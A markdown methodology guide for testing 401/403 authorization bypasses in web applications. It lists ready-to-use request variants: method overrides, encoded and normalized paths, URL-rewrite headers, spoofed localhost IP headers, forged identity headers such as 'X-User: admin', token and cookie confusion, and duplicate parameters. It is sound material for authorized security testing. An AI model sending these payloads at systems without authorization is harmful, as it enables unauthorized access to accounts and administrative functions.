# 401/403 Authorization Bypass Methodology

> A structured workflow for testing authentication and authorization boundaries through method, parser, routing, identity, normalization, and workflow discrepancies.

## Table of Contents

1. [Understand What You Are Bypassing](#understand-what-you-are-bypassing)
2. [HTTP Method Manipulation](#1-http-method-manipulation)
3. [Content-Type Manipulation](#2-content-type-manipulation)
4. [Path Normalization and Routing Discrepancies](#3-path-normalization-and-routing-discrepancies)
5. [Proxy and Rewrite Headers](#4-proxy-and-rewrite-headers)
6. [Client IP and Trusted-Proxy Header Abuse](#5-client-ip-and-trusted-proxy-header-abuse)
7. [Identity Header Injection](#6-identity-header-injection)
8. [Authentication Token Confusion](#7-authentication-token-confusion)
9. [Cookie/Session Inconsistencies](#8-cookiesession-inconsistencies)
10. [Parameter Location Confusion](#9-parameter-location-confusion)
11. [Duplicate Parameter Pollution](#10-duplicate-parameter-pollution)
12. [Encoding and Canonicalization Tests](#11-encoding-and-canonicalization-tests)
13. [API Version and Alternate Route Testing](#12-api-version-and-alternate-route-testing)
14. [Query Flags and Alternate Representations](#13-query-flags-and-alternate-representations)
15. [GraphQL Authorization Bypasses](#14-graphql-authorization-bypasses)
16. [Host and Origin Routing Differences](#15-host-and-origin-routing-differences)
17. [CSRF and Authorization Separation](#16-csrf-and-authorization-separation)
18. [Trailing-Body and Parser Disagreement Tests](#17-trailing-body-and-parser-disagreement-tests)
19. [Workflow-Level Authorization Bypasses](#18-workflow-level-authorization-bypasses)
20. [Practical Testing Sequence](#practical-testing-sequence)
21. [What to Automate vs. Test Manually](#what-to-automate-versus-test-manually)
22. [Higher-Value Mindset](#the-higher-value-mindset-is)

---

## Understand What You Are Bypassing

- **401 Unauthorized** usually means authentication is missing, invalid, or expired.
- **403 Forbidden** usually means the server recognized the request but denied access.

> **Important:** A 403 → 200 response edit is only meaningful when the client then exposes data or triggers a second server-side request that succeeds.

> **The real goal:**

> Make the backend process the same protected operation through a different parsing, routing, identity, or normalization path.

---

## 1. HTTP method manipulation

Test whether authorization is only applied to one method.

```http
GET /admin/users
POST /admin/users
PUT /admin/users
PATCH /admin/users
DELETE /admin/users
HEAD /admin/users
OPTIONS /admin/users
```

Also test method override headers and parameters:

```http
X-HTTP-Method-Override: GET
X-HTTP-Method: GET
X-Method-Override: GET
POST /admin/users?_method=GET
```

High-value pattern:

```http
POST /api/users/123
Content-Type: application/json

{"role":"admin"}
```

Then try:

```http
PATCH /api/users/123
```

or:

```http
POST /api/users/123?_method=PATCH
```

> **Important:** This catches middleware that protects PATCH but not overridden POST.

---

## 2. Content-Type manipulation

Authorization and validation middleware sometimes behave differently depending on the parser.

Start with the original body, then rotate:

```http
Content-Type: application/json
{"user_id":123,"role":"admin"}
Content-Type: application/x-www-form-urlencoded
user_id=123&role=admin
Content-Type: multipart/form-data; boundary=abc
--abc
Content-Disposition: form-data; name="user_id"

123
--abc
Content-Disposition: form-data; name="role"

admin
--abc--
```

Other useful values:

```http
Content-Type: text/plain
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/json;charset=UTF-8
Content-Type: application/vnd.api+json
Content-Type: application/graphql
```

Also try malformed or ambiguous headers:

```http
Content-Type: application/json;
Content-Type: application/json, text/plain
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
```

The point is not random mutation. Look for:

- Different status codes
- Different response lengths
- Validation disappearing
- A protected field being accepted
- The operation succeeding despite an error response

> **Important:** Always verify state afterward.

---

## 3. Path normalization and routing discrepancies

Authorization middleware and application routers may normalize paths differently.

Assume the protected path is:

```http
/admin/users
```

Test:

```http
/admin/users/
/admin//users
/admin/./users
/admin/foo/../users
/admin/users/.
/admin/users/..
/admin/users;
/admin/users;
/admin/users?
/admin/users#
/ADMIN/users
/Admin/Users
```

Encoded variants:

```http
/%61dmin/users
/admin/%75sers
/admin%2fusers
/admin%252fusers
/admin/%2e/users
/admin/%2e%2e/admin/users
/admin%2Fusers
/admin%5Cusers
```

Semicolon and matrix parameter variants:

```http
/admin;/users
/admin/users;anything
/admin;foo=bar/users
```

Suffix tricks:

```http
/admin/users.json
/admin/users.xml
/admin/users.css
/admin/users/
```

Framework-specific route variants:

```http
/admin/users/index
/admin/users/index.php
/admin/users.json
/admin/users?format=json
```

> **Important:** Do not just look for 200. Compare whether the returned resource or resulting state is actually protected.

---

## 4. Proxy and rewrite headers

These are worth testing when the target uses reverse proxies, CDNs, ingress controllers, or multiple backend layers.

Common routing headers:

```http
X-Original-URL: /admin/users
X-Rewrite-URL: /admin/users
X-Forwarded-Uri: /admin/users
X-Forwarded-Path: /admin/users
X-Original-URI: /admin/users
X-Request-URI: /admin/users
```

Example:

```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin/users
```

Also reverse it:

```http
GET /admin/users HTTP/1.1
Host: target.com
X-Original-URL: /
```

The second variant can expose cases where the security layer checks the rewritten path while the backend processes the original path, or vice versa.

---

## 5. Client IP and trusted-proxy header abuse

Some applications allow administrative or internal routes based on IP.

Test carefully:

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-For: 10.0.0.1
X-Real-IP: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
```

Also test chains:

```http
X-Forwarded-For: 127.0.0.1, 8.8.8.8
X-Forwarded-For: 8.8.8.8, 127.0.0.1
```

And IPv6 representations:

```http
X-Forwarded-For: ::1
X-Forwarded-For: 0:0:0:0:0:0:0:1
X-Forwarded-For: ::ffff:127.0.0.1
```

> **Important:** Only report this when the protected functionality actually becomes accessible. Header reflection or a changed error page is weak evidence.

---

## 6. Identity header injection

Targets behind SSO gateways or internal proxies may trust headers that should have been stripped externally.

Look for headers such as:

```http
X-User: admin
X-User-ID: 1
X-Username: admin
X-Email: admin@target.com
X-Remote-User: admin
Remote-User: admin
X-Authenticated-User: admin
X-Auth-User: admin
X-Role: admin
X-Roles: admin
X-Group: administrators
X-Forwarded-User: admin
X-Forwarded-Email: admin@target.com
```

Also test values from your own legitimate session before guessing administrator values. Example:

- Log in normally.
- Identify your user ID, username, tenant ID, and email.
- Send headers containing your real values.
- Change one attribute at a time.
- Check whether the backend trusts the header over the session token.

> **Important:** This is much stronger than blindly sending admin.

---

## 7. Authentication token confusion

For 401 endpoints, compare every accepted credential transport.

Try the same token in:

```http
Authorization: Bearer TOKEN
Cookie: access_token=TOKEN
X-Authorization: Bearer TOKEN
X-Access-Token: TOKEN
X-Auth-Token: TOKEN
```

Query/body placement:

```http
/api/private?access_token=TOKEN
/api/private?token=TOKEN
{"access_token":"TOKEN"}
```

Test malformed scheme variations:

```http
Authorization: bearer TOKEN
Authorization: Token TOKEN
Authorization: JWT TOKEN
Authorization: Bearer    TOKEN
Authorization: Bearer TOKEN,
Authorization: Bearer TOKEN Bearer OTHER
```

Duplicate headers can reveal inconsistent parsing:

```http
Authorization: Bearer INVALID
Authorization: Bearer VALID
```

Then reverse the order.

> **Important:** Be careful: some proxies merge duplicates, while backends choose the first or last value.

---

## 8. Cookie/session inconsistencies

Test whether multiple authentication artifacts conflict.

Examples:

```http
Cookie: session=LOW_PRIV; session=HIGH_PRIV
```

Reverse the order.

Also test:

- Valid session + expired bearer token
- Invalid session + valid bearer token
- User A session cookie + User B CSRF token
- Anonymous cookie + authenticated bearer token
- Mobile token on web API
- Web token on mobile API
- Old session after password change
- Old session after email change
- Old session after role downgrade
- Refresh token where access token is expected

> **Important:** A meaningful bug occurs when the server selects the weaker or attacker-controlled identity unexpectedly.

---

## 9. Parameter location confusion

Move identifiers and authorization-relevant fields between locations.

Original:

```http
GET /api/users/123
```

Try:

```http
GET /api/users?id=123
GET /api/users?user_id=123
GET /api/users/123?id=456
```

With body:

```http
POST /api/users/123
Content-Type: application/json

{"id":456,"user_id":456}
```

Headers:

```http
X-User-ID: 456
X-Account-ID: 456
X-Tenant-ID: 456
```

The core test is conflicting sources:

```http
Path ID: your user
Query ID: victim
Body ID: administrator
Header ID: another tenant
```

Then determine which one the authorization check uses and which one the business logic uses.

> **Important:** That mismatch is a classic authorization bypass.

---

## 10. Duplicate parameter pollution

Different layers may select the first, last, or combined value.

```http
/api/users?id=YOUR_ID&id=VICTIM_ID
/api/users?id=VICTIM_ID&id=YOUR_ID
```

JSON duplicate keys:

```http
{
  "user_id": 100,
  "user_id": 200
}
```

Nested versus flat:

```http
{
  "user_id": 100,
  "user": {
    "id": 200
  }
}
```

Arrays:

```http
user_id=100&user_id[]=200
user_id[]=100&user_id=200
{"user_id":[100,200]}
```

> **Important:** This is especially valuable when a gateway authorizes one value but the application processes another.

---

## 11. Encoding and canonicalization tests

Use encoding where there is a reason to suspect multiple parsers or normalization layers.

For identifiers and paths:

```http
123
0123
000123
+123
123.0
1e2
0x7b
%31%32%33
%2531%2532%2533
```

For strings:

```http
admin
ADMIN
Admin
admin%00
admin%20
admin+
%61dmin
\u0061dmin
```

For slash and dot handling:

```http
/
%2f
%2F
%252f
\
%5c
.
%2e
%252e
```

Unicode normalization can occasionally matter:

```http
admin
ａｄｍｉｎ
admіn
```

> **Important:** The last example uses lookalike Unicode characters. This is lower probability and should not be your first move.

> **Important:** Do not waste hours spraying exotic encodings at every endpoint. Use them when:

- A CDN and backend disagree
- The application decodes input multiple times
- A route changes after encoding
- A WAF blocks the plain version
- The framework accepts multiple numeric representations

---

## 12. API version and alternate route testing

Authorization is often missing from older, mobile, internal, or GraphQL routes.

Try:

```http
/api/users/123
/api/v1/users/123
/api/v2/users/123
/v1/users/123
/rest/users/123
/internal/users/123
/mobile/users/123
/admin-api/users/123
```

Look in JavaScript, mobile bundles, OpenAPI files, GraphQL schemas, and historical URLs for alternate endpoints.

A very common real bug:

```http
/api/v2/admin/users/123 → 403
/api/v1/users/123 → 200
```

> **Important:** The new endpoint is protected; the legacy endpoint is not.

---

## 13. Query flags and alternate representations

Test parameters that may switch serializers, modes, or backend handlers:

```http
?format=json
?output=json
?view=admin
?mode=full
?include=private
?include_hidden=true
?internal=true
?debug=true
?raw=true
?download=true
?export=true
```

Do not blindly append random flags. Mine them from:

- JavaScript
- Swagger/OpenAPI
- Mobile endpoints
- Error messages
- Existing UI requests
- Historical URLs

---

## 14. GraphQL authorization bypasses

For GraphQL, do not stop after a forbidden UI operation.

Test:

- Direct field access
- Aliases
- Fragments
- Nested relationships
- Mutations equivalent to protected REST actions
- Different object lookup methods
- Global IDs versus numeric IDs
- Batch queries
- Introspection-derived alternate operations

Example:

```http
query {
  user(id: "victim-id") {
    email
    billingDetails
  }
}
```

Then try alternate paths:

```http
query {
  organization(id: "org-id") {
    members {
      nodes {
        email
      }
    }
  }
}
```

> **Important:** The direct user resolver may be protected while nested relationship resolvers are not.

---

## 15. Host and origin routing differences

In scoped environments with known valid hosts, test whether another host routes to the same backend with weaker controls.

```http
Host: api.target.com
```

versus:

```http
Host: internal-api.target.com
```

Also test, where clearly in scope:

```http
X-Forwarded-Host: internal.target.com
X-Original-Host: internal.target.com
Forwarded: host=internal.target.com
```

> **Important:** This is valuable when different virtual hosts share an application but have different middleware.

> **Important:** Do not send arbitrary off-scope hostnames or attempt infrastructure-wide spraying.

---

## 16. CSRF and authorization separation

A missing CSRF token is not normally an authorization bypass. However, check whether CSRF middleware accidentally controls whether authentication is processed.

Compare:

- No CSRF token
- Invalid CSRF token
- Another session’s CSRF token
- CSRF token in header versus body
- JSON versus form encoding
- GET used for a state-changing operation

Sometimes a route rejects authenticated requests without CSRF but accepts the same operation through a parser or method where CSRF is not enforced.

> **Important:** The impact is the state change, not merely the missing CSRF check.

---

## 17. Trailing-body and parser disagreement tests

Advanced but useful when frontends and backends use different parsers.

Examples:

```http
{"user_id":123}{"user_id":456}
{"user_id":123}
garbage
```

Form plus JSON-like data:

```http
user_id=123&data={"user_id":456}
```

> **Important:** Different layers may validate one portion and execute another.

> **Important:** Keep this controlled. You are testing parser discrepancies, not trying to desynchronize shared infrastructure.

---

## 18. Workflow-level authorization bypasses

> **Important:** This is where the better bugs are.

A protected endpoint may have an unprotected equivalent action through another workflow:

- Admin invite blocked, but team import permits adding users
- Role editing blocked, but clone/copy preserves privileged role
- Direct file download blocked, but export includes the same file
- Account deletion blocked, but organization deletion cascades
- Billing data blocked, but invoice PDF exposes it
- Email change blocked, but account merge changes ownership
- Private object blocked, but search/index/export exposes it
- Settings update blocked, but bulk update endpoint allows it
- Direct access blocked, but webhook/test-preview fetches it

---

## Stop thinking only in terms of “How do I mutate this request?”

Think:

- What other product feature causes the backend to perform the same privileged action?

> **Important:** That is where serious authorization bypasses live.

---

# Practical Testing Sequence

## For Each Interesting 401 or 403, Run This Order

### 1. Verify the baseline
- Confirm the endpoint works with the properly privileged account.
- Confirm it fails with the low-privileged or anonymous account.

### 2. Swap identity only
- Same request, lower-privileged session.
- Same request, no session.
- Same request, expired session.

### 3. Change method
- `GET` / `POST` / `PUT` / `PATCH` / `DELETE`
- Method override headers and `_method`.

### 4. Change parser
- JSON
- Form
- Multipart
- Plain text
- XML where supported.

### 5. Change route representation
- Trailing slash
- Encoded slash/dot
- Case changes
- Alternate API versions
- Suffixes such as `.json`.

### 6. Test routing headers
- `X-Original-URL`
- `X-Rewrite-URL`
- Forwarded URI variants.

### 7. Test trusted identity/IP headers
- Only when architecture suggests a proxy or SSO layer.

### 8. Create conflicting values
- Path versus query versus body versus header.
- Duplicate parameters and duplicate headers.

### 9. Search for equivalent functionality
- Alternate endpoint
- Bulk route
- Export
- Mobile API
- GraphQL mutation
- Legacy API
- Integration workflow.

### 10. Verify impact
- Re-fetch the object.
- Log into the affected account.
- Confirm the state change.
- Confirm cross-user or cross-role access.
- **Do not rely solely on the response.**

---

# What to Automate Versus Test Manually

## Automate the Low-Context Mutations

- Path normalization
- Method rotation
- Content-Type rotation
- Common proxy headers
- IP headers
- Duplicate parameters
- Basic encoding
- API version variants

## Manually Test

- Identity confusion
- Workflow bypasses
- Multi-tenant boundaries
- Role transitions
- Import/export paths
- Integrations
- Account recovery
- GraphQL relationships
- Business logic equivalents

> **Reality check:** A scanner can tell you a response changed. It cannot reliably tell you whether the authorization model broke.

---

## The Higher-Value Mindset Is

```text
Security layer sees A
Application layer processes B
```

## Every Technique Above Is Trying to Create That Mismatch

- Different path interpretation
- Different identity source
- Different body parser
- Different parameter precedence
- Different API version
- Different workflow reaching the same action
